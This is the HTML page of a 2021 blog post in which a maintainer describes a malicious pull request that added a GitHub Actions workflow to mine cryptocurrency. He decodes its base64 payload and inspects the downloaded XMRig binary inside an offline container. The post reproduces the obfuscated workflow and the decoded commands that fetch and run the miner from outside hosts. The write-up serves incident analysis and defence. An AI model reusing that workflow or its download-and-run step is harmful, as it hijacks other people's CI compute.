@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Crypto-mining attack in my GitHub actions through Pull Request | Tib</title>
+<meta name="generator" content="Jekyll v3.9.5" />
+<meta property="og:title" content="Crypto-mining attack in my GitHub actions through Pull Request" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="In summary, yesterday, I was attacked by a github user that crafted a malicious github action to start a crypto-mining program inside an action run. He triggered it in my github actions thanks to a shitty pull request." />
+<meta property="og:description" content="In summary, yesterday, I was attacked by a github user that crafted a malicious github action to start a crypto-mining program inside an action run. He triggered it in my github actions thanks to a shitty pull request." />
+<link rel="canonical" href="http://localhost:4000/2021/02/09/Crypto-mining-attack-in-my-GitHub-actions-through-Pull-Request.html" />
+<meta property="og:url" content="http://localhost:4000/2021/02/09/Crypto-mining-attack-in-my-GitHub-actions-through-Pull-Request.html" />
+<meta property="og:site_name" content="Tib" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-02-09T18:03:55+01:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Crypto-mining attack in my GitHub actions through Pull Request" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2021-02-09T18:03:55+01:00","datePublished":"2021-02-09T18:03:55+01:00","description":"In summary, yesterday, I was attacked by a github user that crafted a malicious github action to start a crypto-mining program inside an action run. He triggered it in my github actions thanks to a shitty pull request.","headline":"Crypto-mining attack in my GitHub actions through Pull Request","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2021/02/09/Crypto-mining-attack-in-my-GitHub-actions-through-Pull-Request.html"},"url":"http://localhost:4000/2021/02/09/Crypto-mining-attack-in-my-GitHub-actions-through-Pull-Request.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Tib" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">Tib</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Crypto-mining attack in my GitHub actions through Pull Request</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2021-02-09T18:03:55+01:00" itemprop="datePublished">Feb 9, 2021
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p>In summary, yesterday, I was attacked by a github user that crafted a malicious github action to start a crypto-mining program inside an action run. He triggered it in my github actions thanks to a shitty pull request.</p>
+
+<p><img src="/assets/images/1yc0yxawfz8h3xxqtne6.png" alt="Mining attack" /></p>
+
+<p>Below, starts the detailed story of the events and my investigation.</p>
+
+<h1 id="arrow">Arrow</h1>
+<p>Yesterday I was watching an episode of the serie <a href="https://www.netflix.com/fr/title/70242081">Arrow</a>
+<img src="/assets/images/ibo3s46trd9icoavuw9w.png" alt="Arrow" /></p>
+
+<p>It’s a serie that contains a lot of everything including hacking sessions that are much much exaggerated and false, but the serie is cool :smiley:</p>
+
+<p>For the record, <strong>Laurel Lance</strong> I hate you, <strong>Thea Queen</strong> you’re the best! :100:</p>
+
+<p><img src="/assets/images/db2jle3o1fmgh48n9nv3.png" alt="Thea Queen" /></p>
+
+<p>Anyway, during a pause, I looked at devto/hn/linuxfr/github when I saw something that immediately sounded strange…</p>
+
+<p>I got a pull request on a repository where I did not attend any pull requests. I mean, I could receive some, it’s open and some parts can be improved for sure, but it was surprising.</p>
+
+<p>First, the repository does not have any “star” :star:</p>
+
+<p><img src="/assets/images/ybdg3u7d6owfpt564cx2.png" alt="No star" /></p>
+
+<p>It’s a collection of <a href="https://github.com/thibaultduponchelle/messy-ci-workflows/tree/master/.github/workflows">github actions</a>, <a href="https://github.com/thibaultduponchelle/messy-ci-workflows/blob/master/.circleci/config.yml">circle ci</a>, <a href="https://github.com/thibaultduponchelle/messy-ci-workflows/blob/master/.travis.yml">travis-ci</a> examples for Perl projects. And it’s just a complete mess with links to docker images, blog posts, helpers…</p>
+
+<p><img src="/assets/images/8ieaoma2bymfijmieuuw.png" alt="The mess" /></p>
+
+<p>Yes it has a lot of failing actions, but it’s on purpose.</p>
+
+<p>This repository does not seems abandoned (a commit 14 days ago from today) and neither is my profile.</p>
+
+<p>It was forked 2 times in the recent 3 days.</p>
+
+<p>So far, you would think I’m too nervous, but really, it smelled strange even before I looked into the Pull Request details. A sort of bad feeling.</p>
+
+<h1 id="the-strange-pull-request">The strange Pull request</h1>
+<p>Still on my smartphone, I looked at the pull request, it became clear that it was <em>unclear</em> :grinning:</p>
+
+<p>The Pull Request title was “Update actions”. The description was empty :unamused: and the Pull Request has been opened/closed multiple times!</p>
+
+<p>Here is my notification emails about the PR, usually I should receive only one per opened PR:</p>
+
+<p><img src="/assets/images/khzroocccngjlov9k9f8.png" alt="Open Close" /></p>
+
+<p>And the name of the guy is <code class="language-plaintext highlighter-rouge">y4ndexhater1</code> which is really an hacker’s nick :sweat_smile:
+<img src="/assets/images/jb06erpvqsnmpehuza50.png" alt="Y4anderhater1" /></p>
+
+<p>But my mom learned me to <em>never judge people by their appearance</em> so I continued to investigate (but the game was already over :smiley:).</p>
+
+<h1 id="the-nasty-pull-request">The nasty Pull Request</h1>
+<p>I then looked as fast as possible at PR content, I was nervous and rushing, I felt like github was too slow to load the page…</p>
+
+<p>As a meaningful contribution I was expecting some typo corrections, or adding more actions to the set.</p>
+
+<p>But instead, all my actions were proposed to deletion and one new called <code class="language-plaintext highlighter-rouge">ci.yml</code> was added.</p>
+
+<p>Here is the screenshot (I was still on my smartphone):
+<img src="/assets/images/pdag114t5r1tkibzyqu6.png" alt="ci" /></p>
+
+<p>When I saw the <code class="language-plaintext highlighter-rouge">eval "$(echo "YXB0IHVwZGF0ZSAt</code> I jumped from my couch while saying:</p>
+
+<ul>
+  <li>Sorry sweet, I have to start the computer for five minutes, somebody is doing something nasty to hack my github profile</li>
+  <li>Like <a href="https://en.wikipedia.org/wiki/Felicity_Smoak_(Arrowverse)">Felicity Smoak</a>? she said</li>
+  <li>Yes kind of, with less magic. I said</li>
+</ul>
+
+<p>(I’m not discussing in english with my wife, we are french and we respect the french reputation about bad english, you know…:thumbsup:)</p>
+
+<p>The pull request had triggered actions (multiple times since it was opened/closed/opened/closed/opened/closed/opened) and the github actions were currently running… So time was playing against me, and I was very happy to have caught the pull request just few minutes after its creation :muscle:</p>
+
+<p>Especially since each action seemed to start multiple <em>sub-jobs</em>:
+<img src="/assets/images/jt9yvzbnmmbd7lvlh329.png" alt="Sub" /></p>
+
+<p>You can see by yourself the run <a href="https://github.com/thibaultduponchelle/messy-ci-workflows/actions/runs/549053847">549053847</a></p>
+
+<p>When my computer finished to boot, I immediately stopped the jobs and closed the Pull Request.</p>
+
+<p>The content of the <code class="language-plaintext highlighter-rouge">ci.yml</code> was:</p>
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">name</span><span class="pi">:</span> <span class="s">Test</span>
+ <span class="s">on</span><span class="err">:</span> <span class="pi">[</span><span class="nv">pull_request</span><span class="pi">]</span>
+ <span class="na">jobs</span><span class="pi">:</span>
+   <span class="na">test</span><span class="pi">:</span>
+     <span class="na">name</span><span class="pi">:</span> <span class="s">Fetch</span>
+     <span class="na">runs-on</span><span class="pi">:</span> <span class="s">ubuntu-latest</span>
+     <span class="na">container</span><span class="pi">:</span> <span class="s">ubuntu:20.10</span>
+     <span class="na">env</span><span class="pi">:</span>
+       <span class="na">DEBIAN_FRONTEND</span><span class="pi">:</span> <span class="s">noninteractive</span>
+     <span class="na">strategy</span><span class="pi">:</span>
+       <span class="na">fail-fast</span><span class="pi">:</span> <span class="no">false</span>
+       <span class="na">matrix</span><span class="pi">:</span>
+         <span class="na">runner</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0</span><span class="pi">,</span><span class="nv">1</span><span class="pi">,</span><span class="nv">2</span><span class="pi">,</span><span class="nv">3</span><span class="pi">,</span><span class="nv">4</span><span class="pi">,</span><span class="nv">5</span><span class="pi">,</span><span class="nv">6</span><span class="pi">,</span><span class="nv">7</span><span class="pi">,</span><span class="nv">8</span><span class="pi">,</span><span class="nv">9</span><span class="pi">,</span><span class="nv">10</span><span class="pi">,</span><span class="nv">11</span><span class="pi">,</span><span class="nv">12</span><span class="pi">,</span><span class="nv">13</span><span class="pi">,</span><span class="nv">14</span><span class="pi">,</span><span class="nv">15</span><span class="pi">,</span><span class="nv">16</span><span class="pi">,</span><span class="nv">17</span><span class="pi">,</span><span class="nv">18</span><span class="pi">,</span><span class="nv">19</span><span class="pi">]</span>
+     <span class="na">steps</span><span class="pi">:</span>
+       <span class="pi">-</span> <span class="na">run</span><span class="pi">:</span> <span class="pi">|</span>
+           <span class="s">eval "$(echo "YXB0IHVwZGF0ZSAtcXEKYXB0IGluc3RhbGwgLXkgY3VybCBnaXQganEKY3VybCAtTGZvIHByb2cgaHR0cHM6Ly9naXRodWIuY29tL2JocmlzY2FybmF0dC9maXJzdC1yZXBvL3JlbGVhc2VzL2Rvd25sb2FkL2EvcHJvZyB8fCBjdXJsIC1MZm8gcHJvZyBodHRwczovL3RyYW5zZmVyLnNoL09TUGpLL3Byb2cKaXA9JChjdXJsIC1zIC1IICdhY2NlcHQ6IGFwcGxpY2F0aW9uL2Rucy1qc29uJyAnaHR0cHM6Ly9kbnMuZ29vZ2xlL3Jlc29sdmU/bmFtZT1wb29saW8ubWFncmF0bWFpbC54eXomdHlwZT1BJyB8IGpxIC1yICcuQW5zd2VyWzBdLmRhdGEnKQpjaG1vZCB1K3ggcHJvZwp0aW1lb3V0IDRoIC4vcHJvZyAtbyAiJHtpcH06MzAwMCIgLXUgQ2hyaXNCYXJuYXR0IC1wIEV4cGxhaW5pbmdDb21wdXRlcnMgLS1jcHUtcHJpb3JpdHkgNSA+IC9kZXYvbnVsbAo=" | base64 -d)"</span>
+</code></pre></div></div>
+
+<p>The obfuscation with <code class="language-plaintext highlighter-rouge">base64</code> encoding is something usual. I played with an obfuscated <a href="https://fr.wikipedia.org/wiki/Just_Another_Perl_Hacker">JAPH</a> in a recent <a href="https://dev.to/thibaultduponchelle/japhs-autopsies-2-41jl">blog post</a> so it took me 1 second to translate it.</p>
+
+<p>With this obfuscation, I knew at this point that there was a backdoor or a mining program behind.</p>
+
+<h1 id="the-mining-attack">The mining attack</h1>
+<p>When decoding the thing:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"YXB0IHVwZGF0ZSAtcXEKYXB0IGluc3RhbGwgLXkgY3VybCBnaXQganEKY3VybCAtTGZvIHByb2cgaHR0cHM6Ly9naXRodWIuY29tL2JocmlzY2FybmF0dC9maXJzdC1yZXBvL3JlbGVhc2VzL2Rvd25sb2FkL2EvcHJvZyB8fCBjdXJsIC1MZm8gcHJvZyBodHRwczovL3RyYW5zZmVyLnNoL09TUGpLL3Byb2cKaXA9JChjdXJsIC1zIC1IICdhY2NlcHQ6IGFwcGxpY2F0aW9uL2Rucy1qc29uJyAnaHR0cHM6Ly9kbnMuZ29vZ2xlL3Jlc29sdmU/bmFtZT1wb29saW8ubWFncmF0bWFpbC54eXomdHlwZT1BJyB8IGpxIC1yICcuQW5zd2VyWzBdLmRhdGEnKQpjaG1vZCB1K3ggcHJvZwp0aW1lb3V0IDRoIC4vcHJvZyAtbyAiJHtpcH06MzAwMCIgLXUgQ2hyaXNCYXJuYXR0IC1wIEV4cGxhaW5pbmdDb21wdXRlcnMgLS1jcHUtcHJpb3JpdHkgNSA+IC9kZXYvbnVsbAo="</span> | <span class="nb">base64</span> <span class="nt">-d</span>
+</code></pre></div></div>
+
+<p>I get the nasty code:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>apt update <span class="nt">-qq</span>
+apt <span class="nb">install</span> <span class="nt">-y</span> curl git jq
+curl <span class="nt">-Lfo</span> prog https://github.com/bhriscarnatt/first-repo/releases/download/a/prog <span class="o">||</span> curl <span class="nt">-Lfo</span> prog https://transfer.sh/OSPjK/prog
+<span class="nv">ip</span><span class="o">=</span><span class="si">$(</span>curl <span class="nt">-s</span> <span class="nt">-H</span> <span class="s1">'accept: application/dns-json'</span> <span class="s1">'https://dns.google/resolve?name=poolio.magratmail.xyz&amp;type=A'</span> | jq <span class="nt">-r</span> <span class="s1">'.Answer[0].data'</span><span class="si">)</span>
+<span class="nb">chmod </span>u+x prog
+<span class="nb">timeout </span>4h ./prog <span class="nt">-o</span> <span class="s2">"</span><span class="k">${</span><span class="nv">ip</span><span class="k">}</span><span class="s2">:3000"</span> <span class="nt">-u</span> ChrisBarnatt <span class="nt">-p</span> ExplainingComputers <span class="nt">--cpu-priority</span> 5 <span class="o">&gt;</span> /dev/null
+</code></pre></div></div>
+
+<p>I will not explain the <code class="language-plaintext highlighter-rouge">apt</code> lines, we don’t care.</p>
+
+<p>The <code class="language-plaintext highlighter-rouge">curl</code> lines are more interesting, since it retrieves the <code class="language-plaintext highlighter-rouge">prog</code> binary.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-Lfo</span> prog https://github.com/bhriscarnatt/first-repo/releases/download/a/prog <span class="o">||</span> curl <span class="nt">-Lfo</span> prog https://transfer.sh/OSPjK/prog
+</code></pre></div></div>
+<p>From either a github profile (that no longer exists) or a <code class="language-plaintext highlighter-rouge">transfer.sh</code> url that maybe still exists.</p>
+
+<p>Then it seems to use an external service to resolve an IP address (the one for <code class="language-plaintext highlighter-rouge">poolio.magratmail.xyz</code>).</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">ip</span><span class="o">=</span><span class="si">$(</span>curl <span class="nt">-s</span> <span class="nt">-H</span> <span class="s1">'accept: application/dns-json'</span> <span class="s1">'https://dns.google/resolve?name=poolio.magratmail.xyz&amp;type=A'</span> | jq <span class="nt">-r</span> <span class="s1">'.Answer[0].data'</span><span class="si">)</span>
+</code></pre></div></div>
+
+<p>I think that <code class="language-plaintext highlighter-rouge">dns.google</code> is not a nasty domain, but honestly I’m not sure and haven’t much investigated this.</p>
+
+<p>Then it executes <code class="language-plaintext highlighter-rouge">prog</code>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">chmod </span>u+x prog
+<span class="nb">timeout </span>4h ./prog <span class="nt">-o</span> <span class="s2">"</span><span class="k">${</span><span class="nv">ip</span><span class="k">}</span><span class="s2">:3000"</span> <span class="nt">-u</span> ChrisBarnatt <span class="nt">-p</span> ExplainingComputers <span class="nt">--cpu-priority</span> 5 <span class="o">&gt;</span> /dev/null
+</code></pre></div></div>
+<p>:unamused: <code class="language-plaintext highlighter-rouge">ChrisBarnatt</code>… <code class="language-plaintext highlighter-rouge">ExplainingComputers</code>… :unamused:</p>
+
+<h1 id="what-is-prog-">What is <code class="language-plaintext highlighter-rouge">prog</code> ?</h1>
+<p>A backdoor? A mining program? Something else (a github secret stealer)?</p>
+
+<p>If you read carefully the title of this post, you already know the answer :smiley:</p>
+
+<p>I downloaded this <code class="language-plaintext highlighter-rouge">prog</code> since it was still available (not tested recently) at <code class="language-plaintext highlighter-rouge">https://transfer.sh/OSPjK/prog</code></p>
+
+<p>Then I wanted to have info without executing it so I tried</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>file prog
+prog: ELF 64-bit LSB executable, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, statically linked, stripped
+</code></pre></div></div>
+
+<p>Except statically linked, no info :/</p>
+
+<p>Or even:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>objdump <span class="nt">-s</span> <span class="nt">--section</span> .comment prog
+
+prog:     file format elf64-x86-64
+
+Contents of section .comment:
+ 0000 4743433a 2028416c 70696e65 2031302e  GCC: <span class="o">(</span>Alpine 10.
+ 0010 322e315f 70726531 29203130 2e322e31  2.1_pre1<span class="o">)</span> 10.2.1
+ 0020 20323032 30313230 3300                20201203.
+</code></pre></div></div>
+
+<p>Alpine? It even does not have the same libc? But ok…</p>
+
+<p>I quickly looked into the file with <code class="language-plaintext highlighter-rouge">hexedit</code>.</p>
+
+<p>Then, I thought about trying more options with <code class="language-plaintext highlighter-rouge">readelf</code> or <code class="language-plaintext highlighter-rouge">objdump</code> (if you know what are the magic commands, please comment!).</p>
+
+<p>I also thought about decompiling it…</p>
+
+<p>Finally, since it’s a program that requires arguments to work properly, I had the feeling that I could run it safely by using wrong or no arguments so I could get informations about its nature.</p>
+
+<p>Even with this assumption, I would only execute it in a container, with network disabled and on a computer with no internet access.</p>
+
+<h1 id="the-hackers-escape">The hacker’s escape</h1>
+<p><img src="/assets/images/e787m5krz0hkv0p0igsb.png" alt="y4andexhater1" />
+While it took me maybe 7 minutes to stop all the jobs and close the pull request, in the 5 minutes that followed, the <a href="https://github.com/thibaultduponchelle/messy-ci-workflows/pull/7">pull request</a> itself and the user <a href="https://github.com/y4ndexhater1">y4ndexhater1</a> totally disappeared (for your info, it looked an usual profile with projects pinned on the homepage).
+<img src="/assets/images/rxt5syglrsukz27hwho7.gif" alt="Disappear" /></p>
+
+<p>EDIT: GitHub support informed me later that the profile and pull request disappearing was triggered by them flagging this user for suspicious activity :smiley:</p>
+
+<h1 id="inspecting-prog-in-a-container">Inspecting <code class="language-plaintext highlighter-rouge">prog</code> in a container</h1>
+<p>First I disabled my internet connection.
+<img src="/assets/images/v2xlzc480uu1tn90283b.png" alt="Wifi" /></p>
+
+<p>Then I started a docker container without network:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run <span class="nt">-v</span><span class="sb">`</span><span class="nb">pwd</span><span class="sb">`</span>:/tmp <span class="nt">--network</span> none <span class="nt">-it</span> ubuntu bash
+</code></pre></div></div>
+
+<p>At this point, I had a “Poor man’s Qube OS” :grinning: where I can execute <code class="language-plaintext highlighter-rouge">prog</code>.</p>
+
+<p>Here I hesitated a bit before running the untrusted binary…</p>
+
+<p>I hesitated again…</p>
+
+<p>Ok finally I was bold enough to execute the thing and it revealed to be a cryptominer called <a href="https://xmrig.com/">XMRig</a>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>./prog <span class="nt">--version</span>
+XMRig 6.8.1
+ built on Feb  3 2021 with GCC 10.2.1
+ features: 64-bit AES
+
+libuv/1.40.0
+OpenSSL/1.1.1i
+hwloc/2.4.0
+</code></pre></div></div>
+
+<p>The <a href="https://github.com/xmrig/xmrig">XMRig</a> has released <a href="https://github.com/xmrig/xmrig/releases/tag/v6.8.1">6.8.1</a>  some days ago and it coincides with date reported by <code class="language-plaintext highlighter-rouge">./prog --version</code>.</p>
+
+<p>I tried to check if it’s exactly one of the binary from <a href="https://xmrig.com/download">XMRig download page</a></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sha256sum </span>prog
+0a243ac063b60b13dc5e4ea85021faab6109f7e0d2aa68c9691008ed55e54001  prog
+</code></pre></div></div>
+
+<p>But I didn’t find the match, so maybe it’s a modified version of it or it’s even not this thing at all…:flushed:</p>
+
+<h1 id="conclusion">Conclusion</h1>
+<p>To sleep peacefully, I disabled the github actions on this repository (is there an option to disable for a whole github profile?)</p>
+
+<p><img src="/assets/images/lc3kip4iuupw34eww7hb.png" alt="Disable GA" /></p>
+
+<p>I have to admit, I did no slept peacefully last night. I was a bit anxious (for nothing) about having been infected while inspecting the <code class="language-plaintext highlighter-rouge">prog</code> cryptominer :grimacing: so I’m checking all the time my local system status with <code class="language-plaintext highlighter-rouge">netstat</code> and <code class="language-plaintext highlighter-rouge">htop</code>. If you, dear reader, are earning money from my computer CPU, please tell me :grin:</p>
+
+<p>I found absolutely zero info about this attack, does somebody is aware of this? Am I alone? Is this new?</p>
+
+<p>EDIT1: I reported this to GitHub (through support and <a href="https://github.community/t/crypto-mining-attack-in-my-github-actions-through-pull-request/160972">communities</a>)</p>
+
+<p>EDIT2: I found this article <a href="https://blog.aquasec.com/container-security-alert-campaign-abusing-github-dockerhub-travis-ci-circle-ci">Massive Cryptomining Campaign Abusing GitHub</a> that describes the same kind of attack with a different implementation.</p>
+
+<p>EDIT3: GitHub support is aware of these kind of attacks and confirmed this writing. They took actions on the hacker’s profile and deleted the pull request (what I described in “The hacker’s escape”)</p>
+
+<p>EDIT4: The story was about to repeat, I noticed a new user “dir99” that forked this repository and was suspicious. So I immediately disabled the actions. The user was almost new, with some repos created one week ago. The majority of repositories have no description neither code (but each time one tarball in release). The user has no followers neither any star on the repo. Some days later, the profile disappeared. This is a screenshot of the profile:
+<img src="/assets/images/mv4pxmehx4xtxmt50jet.png" alt="dir99" /></p>
+
+<p>EDIT5: In april 2021, @mihi tested with me how the quota of concurrent running jobs were assignated and the conclusion was: <strong>the user who <em>receive</em> the pull request counts as the starting user, not the user whose repo is submitting the pull request</strong> see comments below this post and his <a href="https://github.community/t/whose-concurrent-jobs-are-used-when-running-github-actions-on-a-pull-request/173181">github community forum entry</a></p>
+
+<p>EDIT6: April 22 2021, GitHub put in place new policy and protection against this: <a href="https://github.blog/2021-04-22-github-actions-update-helping-maintainers-combat-bad-actors/">Helping maintainers to combat bad actors</a></p>
+
+<p>EDIT7: June 2021, GitHub infrastructure can (and does) slowdown your scheduled actions without notice (an action scheduled every 20 minutes can run every hours or every 2 hours depending the days)</p>
+
+<p>EDIT8: Queuing actions are now aborted when they are too many in the queue
+<img src="/assets/images/58fp3wpmwaaj5pzhtofe.png" alt="Too many actions queuing" /></p>
+
+  </div><a class="u-url" href="/2021/02/09/Crypto-mining-attack-in-my-GitHub-actions-through-Pull-Request.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Tib</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">Tib</li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>Random code and thoughts</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
